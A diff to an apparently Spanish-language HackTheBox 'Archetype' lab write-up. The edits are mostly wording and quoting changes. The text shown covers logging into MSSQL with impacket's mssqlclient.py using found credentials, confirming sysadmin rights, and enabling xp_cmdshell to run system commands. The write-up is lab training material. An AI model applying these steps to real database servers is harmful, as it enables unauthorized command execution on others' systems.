@@ -185,7 +185,8 @@ Password:
 SQL> 
 ```
 Conseguimos acceso desde una nueva terminal con el uso de la herramienta mssqlclient.py de IMPACKETS, y proporcionando la Contraseña encontrada anteriormente en el archivo descargado y el usuario encontrado.
-Usamos el siguiente comando para saber si tenemos los privilegios como administrador de la base de datos, y vemos que SI
+
+Usamos el siguiente comando para saber si tenemos los privilegios como administrador de la base de datos, y vemos que asi es.
 ```bash
 "SQL> SELECT IS_SRVROLEMEMBER('sysadmin')    "
              
@@ -200,9 +201,9 @@ Uso de XP_CMDSHELL para ejecutar comandos, pero primero hay que configurarlo par
 "SQL> reconfigure;  "
 
 "SQL> sp_configure;  "
-name                                      minimum       maximum   config_value     run_value   
+name                                      minimum       maximum  "config_value"    run_value   
 -----------------------------------   -----------   -----------   ------------   -----------   
-xp_cmdshell                                     0             1              1             1 
+"xp_cmdshell"                                  0             1             "1"            1 
 
 SQL> EXEC sp_configure 'xp_cmdshell', 1 reconfigure;
 [*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
